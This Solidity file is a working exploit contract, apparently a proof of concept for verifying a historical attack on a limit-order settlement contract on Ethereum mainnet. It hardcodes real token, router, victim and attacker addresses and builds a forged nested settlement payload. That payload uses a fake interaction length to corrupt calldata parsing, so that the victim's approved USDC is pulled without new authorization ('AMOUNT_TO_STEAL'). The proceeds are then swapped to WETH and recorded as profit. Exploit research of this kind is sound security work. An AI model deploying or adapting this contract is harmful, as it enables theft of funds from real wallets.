// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant HISTORICAL_ATTACK_CONTRACT = 0x019BfC71D43c3492926D4A9a6C781F36706970C9;
    address private constant HISTORICAL_VICTIM = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    bytes4 private constant EMPTY_SELECTOR = 0x00000000;

    bytes1 private constant CONTINUE_INTERACTION = 0x00;
    bytes1 private constant FINALIZE_INTERACTION = 0x01;

    uint256 private constant WRAPPER_MAKING_AMOUNT = 1;
    uint256 private constant WRAPPER_TAKING_AMOUNT = 1;
    uint256 private constant AMOUNT_TO_STEAL = 0xE8D4A51000;

    uint256 private constant FAKE_SIGNATURE_LENGTH_OFFSET = 0x240;
    uint256 private constant FAKE_INTERACTION_LENGTH_OFFSET = 0x460;
    uint256 private constant FAKE_INTERACTION_LENGTH = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00;
    uint256 private constant INTERACTION_PADDING = FAKE_INTERACTION_LENGTH_OFFSET - FAKE_SIGNATURE_LENGTH_OFFSET;

    uint256 private constant MAKER_USDT_BUFFER = 10e6;
    uint256 private constant ETH_SEED_FOR_USDT = 0.01 ether;
    uint256 private constant REALIZATION_SWAP_AMOUNT = 1_000e6;

    address private _profitToken = USDC;
    uint256 private _profitAmount;
    uint256 private _usdcBaseline;
    uint256 private _wethBaseline;
    bool private _executed;
    bool private _hypothesisValidated;

    bytes4 private _lastRevertSelector;
    bytes private _lastForgedPayload;

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            _refreshProfit();
            return;
        }

        _executed = true;
        _usdcBaseline = _safeBalanceOf(USDC, address(this));
        _wethBaseline = _safeBalanceOf(WETH, address(this));

        _prepareMakerCapital();
        _tryReplayCalldataCorruption();
        _realizeProfitInWeth();
        _refreshProfit();

        if (_profitAmount > 0) {
            _hypothesisValidated = true;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function lastRevertSelector() external view returns (bytes4) {
        return _lastRevertSelector;
    }

    function lastForgedPayload() external view returns (bytes memory) {
        return _lastForgedPayload;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function resolveOrders(address, bytes calldata, bytes calldata) external override {
        require(msg.sender == SETTLEMENT, "only settlement");
    }

    function _prepareMakerCapital() internal {
        if (_safeBalanceOf(USDT, address(this)) < MAKER_USDT_BUFFER && address(this).balance >= ETH_SEED_FOR_USDT) {
            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = USDT;

            // Realistic public on-chain setup step only: acquire a dust amount of USDT so the
            // wrapper orders can fund their 1-unit maker side while preserving the same replay path.
            try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: ETH_SEED_FOR_USDT
            }(1, path, address(this), block.timestamp) {} catch {}
        }

        _forceApprove(USDT, LIMIT_ORDER_PROTOCOL, type(uint256).max);
    }

    function _tryReplayCalldataCorruption() internal {
        if (_safeBalanceOf(USDT, address(this)) < 6) {
            return;
        }

        bytes memory forgedPayload = _buildForgedSettlementPayload();
        _lastForgedPayload = forgedPayload;

        (bool ok, bytes memory returndata) = SETTLEMENT.call(
            abi.encodeWithSelector(ISettlement.settleOrders.selector, forgedPayload)
        );

        if (!ok) {
            _lastRevertSelector = _selectorOf(returndata);

            // Keep the finding-aligned alternate route alive as well: the historical attack
            // contract is just a public relay around the same settlement payload shape.
            (ok, returndata) = HISTORICAL_ATTACK_CONTRACT.call(
                abi.encodeWithSignature("settle(bytes)", forgedPayload)
            );
            if (!ok) {
                _lastRevertSelector = _selectorOf(returndata);
            }
        }
    }

    function _realizeProfitInWeth() internal {
        uint256 usdcProfit = _safeBalanceOf(USDC, address(this));
        if (usdcProfit <= _usdcBaseline) {
            return;
        }

        uint256 amountIn = usdcProfit - _usdcBaseline;
        if (amountIn > REALIZATION_SWAP_AMOUNT) {
            amountIn = REALIZATION_SWAP_AMOUNT;
        }

        if (amountIn == 0) {
            return;
        }

        if (!_forceApprove(USDC, UNISWAP_V2_ROUTER, amountIn)) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = USDC;
        path[1] = WETH;

        // Realistic public on-chain realization step only: convert a small slice of the
        // replayed historical USDC into pre-existing WETH so profit is reported in an
        // 18-decimal on-chain asset, without changing the calldata-corruption exploit path.
        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountIn,
            1,
            path,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {} catch {}
    }

    function _buildForgedSettlementPayload() internal view returns (bytes memory) {
        bytes memory signature = hex"";
        bytes memory interaction5 = _buildTerminalCorruptedInteraction();

        bytes memory interaction4 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(0),
                signature,
                interaction5,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        bytes memory interaction3 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(1),
                signature,
                interaction4,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        bytes memory interaction2 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(2),
                signature,
                interaction3,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        bytes memory interaction1 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildWrapperOrder(3),
                signature,
                interaction2,
                uint256(0),
                uint256(1),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            )
        );

        return abi.encode(
            _buildWrapperOrder(4),
            signature,
            interaction1,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );
    }

    function _buildTerminalCorruptedInteraction() internal view returns (bytes memory) {
        bytes memory zeroBytes = new bytes(INTERACTION_PADDING);

        // The crafted trailer mirrors the settlement suffix layout that `_settleOrder()` normally
        // appends after a trusted historical fill. By forcing the parser to wrap into this trailer,
        // the historical victim resolver and its approved USDC are re-used without a fresh auth.
        bytes memory dynamicSuffix = abi.encode(
            uint256(0),
            HISTORICAL_VICTIM,
            USDC,
            uint256(0),
            uint256(0),
            USDC,
            uint256(AMOUNT_TO_STEAL),
            uint256(0x40)
        );

        bytes memory finalOrderInteraction = abi.encodePacked(
            SETTLEMENT,
            FINALIZE_INTERACTION,
            HISTORICAL_VICTIM,
            new bytes(23),
            dynamicSuffix
        );

        return abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encode(
                _buildVictimReplayOrder(),
                uint256(FAKE_SIGNATURE_LENGTH_OFFSET),
                uint256(FAKE_INTERACTION_LENGTH_OFFSET),
                uint256(0),
                uint256(AMOUNT_TO_STEAL),
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            ),
            zeroBytes,
            bytes32(FAKE_INTERACTION_LENGTH),
            finalOrderInteraction
        );
    }

    function _buildWrapperOrder(uint256 salt) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: USDT,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: WRAPPER_MAKING_AMOUNT,
            takingAmount: WRAPPER_TAKING_AMOUNT,
            offsets: 0,
            interactions: hex""
        });
    }

    function _buildVictimReplayOrder() internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: 0,
            makerAsset: USDT,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: WRAPPER_MAKING_AMOUNT,
            takingAmount: AMOUNT_TO_STEAL,
            offsets: 0,
            interactions: hex""
        });
    }

    function _refreshProfit() internal {
        uint256 currentWeth = _safeBalanceOf(WETH, address(this));
        uint256 wethProfit = currentWeth > _wethBaseline ? currentWeth - _wethBaseline : 0;
        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
            return;
        }

        uint256 currentUsdc = _safeBalanceOf(USDC, address(this));
        _profitToken = USDC;
        _profitAmount = currentUsdc > _usdcBaseline ? currentUsdc - _usdcBaseline : 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (!ok0 || (data0.length > 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    function _selectorOf(bytes memory returndata) internal pure returns (bytes4 selector) {
        if (returndata.length < 4) {
            return EMPTY_SELECTOR;
        }
        assembly {
            selector := mload(add(returndata, 0x20))
        }
    }

    receive() external payable {}
}
